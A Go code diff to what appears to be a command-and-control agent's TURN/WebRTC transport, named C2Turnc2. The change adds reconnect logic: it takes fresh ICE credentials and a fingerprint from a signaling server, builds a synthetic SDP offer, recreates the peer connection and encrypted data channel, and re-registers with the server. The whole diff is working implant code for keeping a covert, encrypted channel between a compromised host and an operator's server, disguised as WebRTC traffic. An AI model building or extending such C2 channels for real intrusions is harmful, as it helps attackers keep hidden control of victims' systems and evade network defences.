@@ -129,10 +129,13 @@ type OfferPayload struct {
 
 // signalingResponse is the JSON response from the signaling server.
 type signalingResponse struct {
-	Status          string `json:"status"`
-	Error           string `json:"error,omitempty"`
-	ServerRelayAddr string `json:"server_relay_addr,omitempty"`
-	ServerRelayPort int    `json:"server_relay_port,omitempty"`
+	Status            string `json:"status"`
+	Error             string `json:"error,omitempty"`
+	ServerRelayAddr   string `json:"server_relay_addr,omitempty"`
+	ServerRelayPort   int    `json:"server_relay_port,omitempty"`
+	ServerICEUfrag    string `json:"server_ice_ufrag,omitempty"`
+	ServerICEPwd      string `json:"server_ice_pwd,omitempty"`
+	ServerFingerprint string `json:"server_fingerprint,omitempty"`
 }
 
 type C2Turnc2 struct {
@@ -589,20 +592,126 @@ func (c *C2Turnc2) establishWebRTC() error {
 		return fmt.Errorf("failed to send minimal answer: %w", err)
 	}
 
-	// Handle reconnect response — server has a new relay address
-	if sigResp.Status == "reconnect" && sigResp.ServerRelayAddr != "" && sigResp.ServerRelayPort > 0 {
-		utils.PrintDebug(fmt.Sprintf("reconnect: updating server relay to %s:%d\n",
-			sigResp.ServerRelayAddr, sigResp.ServerRelayPort))
+	// Handle reconnect response — server created a fresh PC with new ICE creds.
+	// We need to create a new PC using the server's new offer details and POST again.
+	if sigResp.Status == "reconnect" && sigResp.ServerICEUfrag != "" {
+		utils.PrintDebug(fmt.Sprintf("reconnect: server has new ICE creds (ufrag=%s, relay=%s:%d), creating fresh PC\n",
+			sigResp.ServerICEUfrag, sigResp.ServerRelayAddr, sigResp.ServerRelayPort))
 
-		// Trickle the server's new relay candidate
-		candidateStr := fmt.Sprintf("candidate:1 1 udp 16777215 %s %d typ relay raddr 0.0.0.0 rport 0",
-			sigResp.ServerRelayAddr, sigResp.ServerRelayPort)
-		if err := pc.AddICECandidate(pion.ICECandidateInit{
-			Candidate: candidateStr,
-		}); err != nil {
-			pc.Close()
-			return fmt.Errorf("failed to add server relay candidate: %w", err)
+		// Close the current PC — it was created using the old server offer
+		pc.Close()
+
+		// Build a synthetic server offer SDP from the reconnect response
+		syntheticOffer := buildSyntheticOffer(sigResp.ServerICEUfrag, sigResp.ServerICEPwd,
+			sigResp.ServerFingerprint)
+
+		utils.PrintDebug(fmt.Sprintf("[turnc2] synthetic server offer SDP:\n%s\n", syntheticOffer))
+
+		// Create a new peer connection
+		newPC, err := api.NewPeerConnection(rtcConfig)
+		if err != nil {
+			return fmt.Errorf("reconnect: failed to create new peer connection: %w", err)
 		}
+
+		// Reset channels and reassembly state
+		c.recvChannel = make(chan []byte, 100)
+		c.dataChannelReady = make(chan bool, 1)
+		c.recvBufMu.Lock()
+		c.recvBuf = nil
+		c.recvExpected = 0
+		c.recvBufMu.Unlock()
+
+		// Set up handlers on the new PC
+		newPC.OnICECandidate(func(candidate *pion.ICECandidate) {
+			if candidate == nil {
+				return
+			}
+			utils.PrintDebug(fmt.Sprintf("[turnc2] reconnect ICE candidate: %s\n", candidate.String()))
+		})
+		newPC.OnDataChannel(func(dc *pion.DataChannel) {
+			utils.PrintDebug(fmt.Sprintf("reconnect data channel received: %s\n", dc.Label()))
+			c.DataChan = dc
+			dc.OnOpen(func() {
+				utils.PrintDebug(fmt.Sprintf("reconnect data channel open: %s\n", dc.Label()))
+				select {
+				case c.dataChannelReady <- true:
+				default:
+				}
+			})
+			dc.OnMessage(func(msg pion.DataChannelMessage) {
+				if c.ShouldStop {
+					return
+				}
+				c.handleChunkedRecv(msg.Data)
+			})
+			dc.OnClose(func() {
+				utils.PrintDebug("reconnect data channel closed\n")
+			})
+		})
+		newPC.OnConnectionStateChange(func(state pion.PeerConnectionState) {
+			utils.PrintDebug(fmt.Sprintf("reconnect WebRTC state: %s\n", state.String()))
+		})
+
+		// Set the synthetic server offer as remote description
+		remoteSDP := pion.SessionDescription{
+			Type: pion.SDPTypeOffer,
+			SDP:  syntheticOffer,
+		}
+		if err := newPC.SetRemoteDescription(remoteSDP); err != nil {
+			newPC.Close()
+			return fmt.Errorf("reconnect: failed to set remote description: %w", err)
+		}
+
+		// Trickle the server's relay candidate
+		serverCandidateStr := fmt.Sprintf("candidate:1 1 udp 16777215 %s %d typ relay raddr 0.0.0.0 rport 0",
+			sigResp.ServerRelayAddr, sigResp.ServerRelayPort)
+		if err := newPC.AddICECandidate(pion.ICECandidateInit{
+			Candidate: serverCandidateStr,
+		}); err != nil {
+			newPC.Close()
+			return fmt.Errorf("reconnect: failed to add server relay candidate: %w", err)
+		}
+
+		// Create new answer
+		newAnswer, err := newPC.CreateAnswer(nil)
+		if err != nil {
+			newPC.Close()
+			return fmt.Errorf("reconnect: failed to create answer: %w", err)
+		}
+		if err := newPC.SetLocalDescription(newAnswer); err != nil {
+			newPC.Close()
+			return fmt.Errorf("reconnect: failed to set local description: %w", err)
+		}
+
+		// Wait for ICE gathering
+		gatherComplete2 := pion.GatheringCompletePromise(newPC)
+		<-gatherComplete2
+
+		finalAnswer2 := newPC.LocalDescription()
+		newRelayAddr, newRelayPort := extractRelayCandidate(finalAnswer2.SDP)
+		if newRelayAddr == "" || newRelayPort == 0 {
+			newPC.Close()
+			return fmt.Errorf("reconnect: no relay candidate in new answer")
+		}
+		newUfrag, newPwd := extractICECredentials(finalAnswer2.SDP)
+		newFingerprint := extractFingerprint(finalAnswer2.SDP)
+
+		utils.PrintDebug(fmt.Sprintf("[turnc2] reconnect: sending second POST with new answer (relay=%s:%d)\n",
+			newRelayAddr, newRelayPort))
+
+		// Send second minimal answer
+		sigResp2, err := c.sendMinimalAnswer(c.OfferID, newRelayAddr, newRelayPort, newUfrag, newPwd, newFingerprint)
+		if err != nil {
+			newPC.Close()
+			return fmt.Errorf("reconnect: second signaling POST failed: %w", err)
+		}
+		if sigResp2.Status == "error" {
+			newPC.Close()
+			return fmt.Errorf("reconnect: second signaling error: %s", sigResp2.Error)
+		}
+
+		utils.PrintDebug(fmt.Sprintf("[turnc2] reconnect: second POST status=%s\n", sigResp2.Status))
+		pc = newPC
 	}
 
 	c.PeerConn = pc
@@ -1045,6 +1154,26 @@ func (c *C2Turnc2) encryptMessage(msg []byte) []byte {
 func (c *C2Turnc2) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
+}
+
+// buildSyntheticOffer constructs a minimal SDP offer from the server's ICE/DTLS
+// parameters. Used during reconnect when the server has created a fresh PC.
+// The offer has no ICE candidates — the server's relay candidate is trickled separately.
+func buildSyntheticOffer(iceUfrag, icePwd, fingerprint string) string {
+	return "v=0\r\n" +
+		"o=- 0 0 IN IP4 0.0.0.0\r\n" +
+		"s=-\r\n" +
+		"t=0 0\r\n" +
+		"a=group:BUNDLE 0\r\n" +
+		"a=msid-semantic: WMS\r\n" +
+		"m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n" +
+		"c=IN IP4 0.0.0.0\r\n" +
+		"a=mid:0\r\n" +
+		"a=ice-ufrag:" + iceUfrag + "\r\n" +
+		"a=ice-pwd:" + icePwd + "\r\n" +
+		"a=fingerprint:" + fingerprint + "\r\n" +
+		"a=setup:actpass\r\n" +
+		"a=sctp-port:5000\r\n"
 }
 
 // SDP parsing helpers — extract minimal answer fields from local SDP
